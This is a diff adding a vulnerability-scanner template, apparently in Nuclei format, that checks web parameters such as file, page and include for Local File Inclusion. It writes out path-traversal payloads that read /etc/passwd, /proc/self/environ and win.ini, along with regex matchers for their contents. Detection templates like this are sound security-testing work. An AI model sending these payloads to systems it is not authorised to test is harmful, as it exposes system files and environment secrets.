@@ -1,0 +1,31 @@
+id: lfi-basic
+
+info:
+  name: Local File Inclusion
+  author: moriarty
+  severity: critical
+  description: Detects Local File Inclusion vulnerabilities
+  tags: lfi,injection
+
+requests:
+  - method: GET
+    path:
+      - "/?file={{lfi}}"
+      - "/?page={{lfi}}"
+      - "/?include={{lfi}}"
+      - "/index.php?file={{lfi}}"
+
+    payloads:
+      lfi:
+        - "/etc/passwd"
+        - "../../../../etc/passwd"
+        - "..\\..\\..\\..\\windows\\win.ini"
+        - "/proc/self/environ"
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "for 16-bit app support"
+          - "\\[extensions\\]"
+        condition: or
